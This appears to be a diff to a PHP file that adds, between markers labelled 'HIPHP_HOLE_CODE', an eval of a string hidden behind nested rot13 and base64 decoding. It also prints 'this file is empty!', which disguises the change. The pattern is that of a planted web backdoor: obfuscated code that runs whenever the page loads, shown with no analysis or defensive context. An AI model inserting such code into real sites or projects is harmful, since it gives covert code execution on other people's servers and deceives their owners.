@@ -10,7 +10,11 @@
 # --+----------------------------------------------------------+--
 #   |                                                          |
 
-    #START{
-    phpinfo();
-    #}END.
+#START{
+/*HIPHP_HOLE_CODE START*/
+eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('pJSnLyqGBIEVrRyKFUuWo1pkFIISZRSmEyWAExIWBHWWH1qCEJkkpHAUZTSnq05fpSD4AHS3I2ujHHt1JySjZJ9grQWOIQudDJ1FZIcuHzknoHIcDJ1BLIuYM2kjIHy2I2knoScEI2cioKtlJab1nxSUrTcOoHycDxqZZT9gGwAnE0ufpRqJoHSHBQAnHUN3pJSnLaS6GKcjraOvI1Z5HHE4GIIXoUSdGTSwAz96H2gKZGOwJRgaoT5XAGILHRImEQOKIRHkMzSjISp2pab1qKOTpKSLE2p5pUcaZx1gMmx='))))));
+/*HIPHP_HOLE_CODE END*/
+
+echo "this file is empty!";
+#}END.
 ?>
